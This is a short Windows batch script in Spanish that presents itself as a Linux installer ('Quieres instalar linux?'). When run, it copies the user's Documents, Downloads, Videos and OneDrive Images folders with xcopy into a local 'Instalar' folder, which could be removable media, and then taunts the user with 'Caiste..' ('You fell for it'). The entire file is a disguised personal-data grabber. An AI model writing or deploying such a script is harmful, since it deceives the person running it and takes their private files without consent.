@echo off
color a
title "Instalacion"
echo "Quieres instalar linux?"
pause
echo "1"
xcopy "C:\Users\%USERNAME%\Documents\" /E Instalar\%USERNAME%\Documents\
echo "2"
xcopy "C:\Users\%USERNAME%\Downloads\" /E Instalar\%USERNAME%\Downloads\
echo "3"
xcopy "C:\Users\%USERNAME%\Videos\" /E Instalar\%USERNAME%\Videos\
echo "4"
xcopy "C:\Users\%USERNAME%\OneDrive\Imágenes\" /E Instalar\%USERNAME%\
echo "Caiste.."
pause
